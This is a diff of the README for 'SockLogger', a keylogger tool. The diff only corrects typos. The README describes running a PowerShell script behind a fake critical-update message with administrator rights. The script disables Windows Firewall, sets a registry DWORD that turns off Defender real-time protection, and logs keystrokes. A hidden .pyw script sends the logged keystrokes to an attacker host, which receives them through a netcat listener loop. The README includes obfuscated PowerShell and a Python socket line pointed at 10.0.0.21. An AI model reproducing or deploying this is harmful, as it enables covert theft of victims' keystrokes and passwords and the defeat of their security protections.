@@ -1,7 +1,7 @@
 # SockLogger-
 A creative way to evade 'Real time protection' and 'Windows Firewall' on windows, and obtain victim key-strokes by obfuscate keylogger and using 'nc' on remote machine. While trying looking for a way to make a simple keylogger, thought it would be interesting to make an obfuscate keylogger which will executed upon a running .ps1 with a fake message update about critical problems using powershell ofcourse. Started to make a script which will make 3 things, but first it must run as Administrator privilege;
 1. Turn off the Windows Firewall Center.
-2. enject a malicious DWORD on the registry will will make the real time protection going down upon a reboot.
+2. enject a malicious DWORD on the registry which will make the real time protection going down upon a reboot.
 3. Disable the real time protection.
 4. Save keystrokes on the C:\Windows\System32 directory and obtain it using a python to open a server on the victim machine.
 5. When the the SockLogger-Obfuscate.pyw gets execute [ Using .pyw for making it run in the background ], it's send the keystrokes of the victim to a remote machine [ Attacker ] on the other side by using the next command for listening in a loop: 'while true; do nc -lvnp [PORT]; done' [ in my case is PORT 8080 ].
@@ -32,4 +32,4 @@ ${MAc`H`iNe} = ("{5}{2}{0}{3}{1}{4}"-f '://','.0.0.21','tp','10',':','ht') - .ps
 m.connect(("10.0.0.21", 8080)) - .pyw script
 </pre>
 in my case, the .ps1 was 10.0.0.21 on port 80, and the listener was on port 8080.<br>
-please, if you are having any problems, i would like to know. soon i will make a python script which will execute it all in one code. please notice that the .pyw script {python} saved at 'C:\Users\public directory'
+please, if you are having any problems, i would like to know. soon i will make a python script which will execute it all in one code. please notice that the .pyw script {python} saved at 'C:\Users\public' directory
